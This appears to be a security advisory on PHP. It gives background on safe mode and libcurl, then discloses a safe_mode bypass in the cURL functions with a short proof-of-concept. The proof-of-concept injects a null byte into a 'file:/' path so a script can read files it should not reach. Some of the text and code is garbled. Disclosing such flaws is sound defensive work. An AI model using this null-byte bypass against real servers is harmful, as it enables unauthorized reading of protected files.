Much of its syntax is borrowed from C , Java and Perl with a couple of unique PHP-specific features thrown in. The goal of the language is to allow web developers to write dynamically generated pages quickly. ， A nice introduction to PHP by Stig Sather Bakken can be found at on the Zend website. Also , much of the PHP Conference Material is freely available. ， The PHP safe mode is an attempt to solve the shared-server security problem. It is architecturally incorrect to try to solve this problem at the PHP level , but since the alternatives at the web server and OS levels aren't very realistic , many people , especially ISP's , use safe mode for now. ， PHP supports libcurl , a library created by Daniel Stenberg , that allows you to connect and communicate to many different types of servers with many different types of protocols. libcurl currently supports the http , https , ftp , gopher , telnet , dict , file , and ldap protocols. libcurl also supports HTTPS certificates , HTTP POST , HTTP PUT , FTP uploading ( this can also be done with PHP's ftp extension )  , HTTP form based upload , proxies , cookies , and user+password authentication. ， These functions have been added in PHP 4.0.2. ， - - 1. Safe Mode Bypass in cURL- ， General problem exists in cURL functions , because are changed safe_mode , strings 0 ( \\x00 ) are change to \"_\". Next bug exists in prefix file : / , becaluse safe_mode checks only path at file : /. ， Example :  ， - -Safe_Mode bypass exploit.1- ， <? ，  $ ch = curl_init ( \"file : /filethatyoudonthaveaccessto.php\\x00\"._FILE_ )  ;  ， curl_exec (  $ ch )  ;  ， var_dump ( curl_exec (  $ ch )  ;  ， ?> ， - -Safe_Mode bypass exploit.1- ， Safe_mode checks only access only to _FILE_. But cURL include filethatyoudonthaveaccessto.php. So you can include any files from directory where script is. ， But in this exploit , you can only read files from directory where is this script. You can't use \"/\".",
